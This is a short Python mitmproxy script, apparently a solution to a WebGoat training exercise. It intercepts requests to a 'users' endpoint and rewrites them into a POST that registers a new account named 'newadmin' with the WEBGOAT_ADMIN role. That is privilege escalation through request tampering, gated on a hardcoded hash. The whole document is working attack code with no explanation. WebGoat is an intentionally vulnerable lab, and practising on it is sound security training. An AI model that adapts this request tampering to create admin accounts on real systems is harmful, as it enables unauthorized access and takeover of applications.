from mitmproxy import http
from mitmproxy import ctx

import json

# Keep empty string when hash not found, fill later on.
FOUND_HASH = "SMdwYhRuQLt7VghjhewkOiibS69jNaMSZHU+Tah+xuA="

def request(flow: http.HTTPFlow) -> None:
  if 'users' in flow.request.url:
    flow.request.headers['content-type'] = 'application/json; charset=UTF-8'

    if FOUND_HASH:
      flow.request.method = 'POST'
      flow.request.text = json.dumps(
        {"username":"newadmin",
        "password":"newadmin",
        "matchingPassword":"newadmin",
        "role":"WEBGOAT_ADMIN"})
